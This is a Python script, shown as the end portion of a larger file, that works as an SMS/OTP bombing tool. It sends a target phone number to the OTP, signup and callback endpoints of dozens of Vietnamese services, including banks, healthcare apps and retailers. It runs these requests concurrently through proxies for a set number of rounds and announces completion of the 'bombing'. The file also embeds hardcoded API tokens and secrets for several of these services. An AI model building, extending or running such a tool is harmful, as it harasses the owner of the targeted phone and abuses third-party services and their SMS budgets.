        print(f"SeaOffers | ~> Lỗi ")


async def wooribank(phone):
    device_id = str(uuid.uuid4()).upper()
    try:

        response = await make_request('POST', 
            'https://won.woori.com.vn/vn/mb/join/MBJO310_03I_01.json',
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': '*/*',
                'User-Agent': 'MOBILEBANKINGAPP/2.0.97 (iPhone; iOS 18.1; Scale/3.00)',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
            },
            data=(
                f'sbUuid={device_id}'
                f'&appOsVersion=2.0.97'
                f'&deviceId={device_id}'
                f'&telNo={phone}'
                f'&locale=vi_vn'
                f'&appType=i'
            ),
        )
        print(f"WooriBank | -> OK -> ")
    except Exception:
        print(f"WooriBank | ~> Lỗi ")


_CAPICHI_TOKEN = 'eyJhbGciOiJIUzI1NiJ9.eyJzb3VyY2UiOiJjYXBpY2hpX2RlbGl2ZXJ5In0.cN8r9MVMtvpgZetsd7q-1XXlYT7q71rakWgnJ9sBeDg'

async def capichi(phone):
    phone_intl = to_vn_intl_format(phone)
    try:

        response = await make_request('POST', 
            'https://genesis.capichiapp.com/api/v1/users/request_otp',
            headers={
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Authorization': _CAPICHI_TOKEN,
                'Accept-Language': 'en',
                'User-Agent': 'Capichi/4.0 CFNetwork/1568.200.51 Darwin/24.1.0',
            },
            json={'phone': phone_intl},
        )
        print(f"Capichi | -> OK -> ")
    except Exception:
        print(f"Capichi | ~> Lỗi ")


_ONLIVETV_V2_HEADERS = {
    'Content-Type': 'application/json',
    'DeviceName': 'iPhone 12 Pro',
    'Version': '1.2.7',
    'Accept': '*/*',
    'DevicePlatform': '0',
    'Accept-Language': 'vn',
    'TokenDevice': 'cp_jEEnSk0fLmyHFvbSM8e:APA91bFLR-JXojSnxl7nv_QKmiZXwciyqW_RNZaGdMj6EXnTUGKyVrfYG3786nB3Yx3jJqON6sDo4-qMUzUAwflhbgMDJt9ndzjwyOPANVmpH73JHHIGojs',
    'SessionID': '',
    'User-Agent': 'ON Live TV/1.2.7 (vn.vtvlive.ontv.i; build:26021010; iOS 18.1.0) Alamofire/5.9.0',
    'DeviceType': 'iPhone 12 Pro',
    'DeviceBrand': 'Apple',
}

async def onlivetv_v2(phone):
    device_id = str(uuid.uuid4()).upper()
    try:
        response = await make_request('POST', 
            'https://id-public-api.onlivetv.vn/api/v2/phone?platform=5&version=1.2.7',
            headers=_ONLIVETV_V2_HEADERS,
            json={
                'metadata': {
                    'device_id': device_id,
                    'device_name': 'iPhone 12 Pro',
                    'app_version': '1.2.7',
                    'os_version': '18.1',
                    'device_os': 'ios',
                },
                'phone': phone,
            })


        response = await make_request('POST', 
            'https://id-public-api.onlivetv.vn/api/verify_otp?platform=5&version=1.2.7',
            headers=_ONLIVETV_V2_HEADERS,
            json={'phone': phone, 'otp_provider': 'zalo'})

        print(f"OnliveTV_V2 | -> OK -> ")
    except Exception:
        print(f"OnliveTV_V2 | ~> Lỗi ")

_MEDITECH_TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjM4ZTExZGNiLTFjNjgtNGEzNy1hNDA1LWY3YjBmNWRhYjQzMiIsInRva2VuSWQiOiIxZTNhN2I1MS03NDM1LTQxMjUtYTQ5Ny02YmU2ZGQ1ODczZDgiLCJuYmYiOjE3ODM2NDMxOTIsImV4cCI6MTc4MzcyOTU5MiwiaWF0IjoxNzgzNjQzMTkyfQ.AKL3Hpz1FLhXIXwEvc40uX9tfEKUo6F188OQO-v1RVs'
_MEDITECH_SECRET = '27SiA7zQelxg8Ih6XkjkggiSurOZlAjc'

async def meditech(phone):
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'MediCare/1 CFNetwork/1568.200.51 Darwin/24.1.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Authorization': f'Bearer {_MEDITECH_TOKEN}',
    }
    try:

        response = await make_request('POST', 
            'https://identity-api-prod.meditech.vn/vi/api/v1.0/User/send-otp',
            headers=headers,
            json={'phoneNumber': phone, 'type': 0, 'secretKey': _MEDITECH_SECRET})

        print(f"Meditech | -> OK -> ")
    except Exception:
        print(f"Meditech | ~> Lỗi ")

_MEDIGO_APP_AUTH = '1783643275:1507db3966474f0b97974dc73c69cc799359cfc757c59c252a13fcd2977ee597'

async def medigo(phone):
    headers = {
        'Content-Type': 'application/json',
        'x-medigo-app-ua': 'Medigo-User/12.9.8 (com.medigo.user; build:1; iOS 18.1; iPhone13,3; iPhone 12 Pro) RN0.80',
        'User-Agent': 'medigo_mobile_user/1 CFNetwork/1568.200.51 Darwin/24.1.0',
        'Accept': 'application/json',
        'Accept-Language': 'vi',
        'Authorization': '',
        'x-medigo-app-auth': _MEDIGO_APP_AUTH,
    }
    try:

        response = await make_request('POST', 
            'https://auth.medigoapp.com/prod/getOtpV2?from=SMS',
            headers=headers,
            json={'phone': phone})

        print(f"Medigo | -> OK -> ")
    except Exception:
        print(f"Medigo | ~> Lỗi ")

_BOOKINGCARE_RETOKEN = '0cAFcWeA6mIWVFdrNYsvV2ernb7CYkNjKPqls45jhF_LDm6OIAq99oiADwkCgwXhkGydEVCyYgzthE48e4w384YOliHISdOMghGNz1LRl_6F-5h1rRlEvTHPVUQvXr6Gm5UAYwRRJQc34IfDxgtPhiiiK47lW2jBJt_hN2D_noq5ac5NJES4oyxGbLF-sqkt-JEA2PefQm_IOQEVrYYdYA0CGviN2gnhCfvEOISEY6QNXzxDdZG-mDRcBmiH44ZR11ocDHGo8eU4w_er_-Ffzk_dKbhhbOsI1XBVx8qQSl3Wa0Mp9CtAjZ-N6xY5NJ1UY5mhSjLT4wV2RmRvZ-JN0xhEga-3ug41N3u9AZkp_RCf2gx7f_0sDSQt2UziLMqnQEnjr4axF8e8OBFV_UnZe3In44ypo3s-T42vtoyViXMa1UwIY0KsligNEgVLFy9pKe14O0d_QYe1uEAltbHtO4U_h-rFWFm-ElJqeTJG_Nrw4cYP_khxjVdxLSG0IpYLo3Y9HLdggUyo_cKVXQD0IymXCdlyKatXb531e0gnheGicE7FwOUHwOuhmmXp8Aw8SHvlvKar5J1rD5dy20WdVcvRvAKScAjuz_hZx7k00IA2vrlrbKoM_t87RoQPXhEllQTlUqApO_BNyRAyV-rbljmr6DxWGuTZpT1xEIj5eapxVTiXmruip9Aorp-5RQeGjJNVMnOJ-f0_13vvWovgha1iD0pRCmPEhkxK_UchCLdRv3bvA9Bc5qqkbFjfWMIA8wy0tNJBC7xnyMwWavLItinoz3mCY_M9aJOrua9lmPX9ldY_A2lXkNWKupE4RMZBCL68BndatzP5_qqCmKapexf8C7u1kiOUWi-GooHR-BELS3o6Cv6fZl7zRzb0iqxRh5oCIJU4gBek1wqctFTbqWrFo6Ovf_olK9UJhUgDskiLkSARpRhrdgjMyPDpj_xAPdCqa0pQTNCV7jeTVdM2Ue5YGHyoLe7BuKX3dqHtqxTSCkYdn7Yjm1MQthf14vyMrwhHzPfYtl9lIknVc-EVhs1aiE1vAgfjXIxUmQzrjoRsXYvLNYzZ-mD0Y'

async def bookingcare(phone):
    headers = {
        'Accept': '*/*',
        'bcclientdeviceid': 'iPhone13,3',
        'bcclientos': 'ios',
        'bcclientuniqueid': str(uuid.uuid4()).upper(),
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'User-Agent': 'BookingCare/534 CFNetwork/1568.200.51 Darwin/24.1.0',
        'bcclientbuildnumber': '534',
        'bcclientversion': '2.5.7',
    }
    try:

        response = await make_request('POST', 
            'https://bookingcare.vn/api/smsLayma2', 
            headers=headers,
            files={
                'retoken': (None, _BOOKINGCARE_RETOKEN),
                'phone': (None, phone),
            })

        print(f"BookingCare | -> OK -> ")
    except Exception:
        print(f"BookingCare | ~> Lỗi ")

async def vib_maxagent(phone):
    device_id = str(uuid.uuid4()).upper()
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'app-version': '1.3.4.2',
        'brand': 'Apple',
        'android_id': 'unknown',
        'os': 'ios',
        'device_token': device_id,
        'isnfcsupported': 'true',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'device_id': 'iPhone13,3',
        'User-Agent': 'Max%20Super%20Agent/2 CFNetwork/1568.200.51 Darwin/24.1.0',
        'isloggedin': 'false',
    }
    try:

        response = await make_request('POST', 
            'https://api-maxagent.vib.com.vn/auth/api/v1/otp',
            headers=headers,
            json={
                'android_id': 'unknown',
                'brand': 'Apple',
                'device_id': 'iPhone13,3',
                'device_token': device_id,
                'os': 'Apple',
                'phone_number': phone,
                'type': 0,
            })

        print(f"VIB_MaxAgent | -> OK -> ")
    except Exception:
        print(f"VIB_MaxAgent | ~> Lỗi ")

async def dienmayxanh_aio(phone):
    device_id = str(uuid.uuid4()).upper()
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'os': 'ios',
        'platform': '2',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'deviceid': device_id,
        'User-Agent': f'3.0.6||iOS||18.1||{device_id}',
        'device_id': device_id,
        'x-version-app': '3.0.6',
        'siteid': '97',
        'x-platform': 'app',
    }
    try:

        response = await make_request('POST', 
            'https://www.thodienmayxanh.com/gw/mwg-busapi-identity//api/v1/auth/aio/sessions',
            headers=headers,
            json={'phoneNumber': phone, 'callbackUrl': 'thodienmayxanh://'})

        print(f"DienMayXanh_AIO | -> OK -> ")
    except Exception:
        print(f"DienMayXanh_AIO | ~> Lỗi ")



async def run(phone, i):
    direct_session, http_proxy_sessions = (
        await session_manager.get_sessions(1)
    )
    await check_current_ips()

    functions = [
        tv360, 
        vuiapp_signup, vinwonders, call8,
        kingz, bibomart, vinfastescooter, babilala, edupia, shopeecall,
        longchau, longchau1, tiemchunglc, tiemchunglc1,
        dongcre, pnj, bachhoaxanh, mycall, onlive, onlivezl,
        # ── đoạn 2/4 ──────────────────────────────────────────────────────────────
        vuiapp_signup_otp, abond, shbfinance, vtso, vtmoney,
        hoahao, ilokafood1, ilokafood2,
        heyu, thecoffeehouse, thegioi, dienmayxanh, batdongsan, myvt, vtpost,
        vhome, hasaki, ivuvu, sapo, vnfite, onehousing, eurowindow_lightcity, dichvunhaviet, phuha,
        cropee, a28, finvay, tmatsuoka, mobifone,
        hainong, huythanhjewelry,
        # ── đoạn 3/4 ──────────────────────────────────────────────────────────────
        vuiapp_forgot,                                                   # Flow 3
        tamanh, smed, vinasun1,
        vayphu, nnbanana, vnadmin, vinasecurities2, vinasun, tgss, tgss_otp,
        daiichi, hqc247, toptop, jobsgo, call9,
        isofhcare1, isofhcare2, thucuc,
        utop, menaselect,
        tgss2, dichvunuoc,
        bwaco, dowaco, speed, vexere, fiksgo,
        thoviet_datlich, thoviet_baohanh,
        sentSms_BVSante, sentSms_BVPDVn, sentSms_GiupViecTot,
        sentSms_Medpro_HoanMy, sentSms_Medpro_DaLieu, sentSms_Medpro_UMC2,
        # ── đoạn 4/4 ──────────────────────────────────────────────────────────────
        vuiapp_forgot_otp,                                               # Flow 4
        hihihi1, hihihi2, hihihi3, kaka8, pvi,
        isofhcare_dongda, isofhcare_daihocyhanoi, isofhcare_bvchoray, isofhcare_etw, hi1,
        coop, vitadairy, avakids,
        giaothong365_register, giaothong365_forgot, sunlife_tuvan, camkhe_tuvan, edufin_tuvan, call3,
        aia_tuvan, odclick_tuvan,
        demxinh_lienhe, moneyhcm24h_otp,
        vinasun_register, lottefinance, isofhcare_nhidong,
        tima, tima_check_phone_exists, tima_lender_register, tima_aff_get_otp,
        nhakhoaquoctevietphap_datlich,
        seabankasset,
        mafc, seaoffers, wooribank, capichi,
        onlivetv_v2, meditech, medigo, bookingcare, vib_maxagent, dienmayxanh_aio,
    ]

    tasks = [
        func(phone) if asyncio.iscoroutinefunction(func) else asyncio.to_thread(func, phone)
        for func in functions
    ]

    completed = 0
    successful = 0
    failed = 0
    results_detail = []

    try:
        results = await asyncio.wait_for(asyncio.gather(*tasks, return_exceptions=True), timeout=20)
        for i, res in enumerate(results):
            completed += 1
            func_name = functions[i].__name__
            if isinstance(res, Exception):
                failed += 1
                results_detail.append(f"❌ {func_name}: {str(res)[:50]}")
                print(f"[{completed}/{len(functions)}] ✗ {func_name}", end='\r')
            else:
                # Kiểm tra response từ multi_request_race
                if isinstance(res, dict) and res.get('success'):
                    successful += 1
                    conn_type = res.get('connection', 'unknown')
                    elapsed = res.get('elapsed', 0)
                    results_detail.append(f"✅ {func_name}: OK via {conn_type} ({elapsed:.1f}s)")
                elif hasattr(res, 'status') and res.status in [200, 201, 202]:
                    successful += 1  
                    results_detail.append(f"✅ {func_name}: Status {res.status}")
                else:
                    failed += 1
                    if isinstance(res, dict):
                        error_msg = res.get('error', 'Unknown error')
                        conn_type = res.get('connection', 'unknown')
                        results_detail.append(f"❌ {func_name}: {error_msg} via {conn_type}")
                    else:
                        results_detail.append(f"❌ {func_name}: Invalid response")
                print(f"[{completed}/{len(functions)}] ⚡ {func_name}", end='\r')
    except asyncio.TimeoutError:
        failed = len(functions) - successful
        results_detail.append("⏰ Timeout after 20 seconds")

    print(f"\n✅ Vòng {i} hoàn tất | Thành công: {successful}, Thất bại: {failed}")

    # In chi tiết kết quả
    for detail in results_detail:
        print(f"  {detail}")

    await asyncio.sleep(1)


async def main():
    if len(sys.argv) < 3:
        print(f'Usage: python {sys.argv[0]} <phone_number> <count>')
        sys.exit(1)

    phone = sys.argv[1].strip()
    count = int(sys.argv[2])

    try:
        for i in range(1, count + 1):
            print(f"\n🚀 [LẦN {i}] Số: {phone}")
            await run(phone, i)
    finally:
        await session_manager.close_sessions()

    print("\n🎉 Đã hoàn tất tất cả các vòng bombing!")

if __name__ == "__main__":
    asyncio.run(main())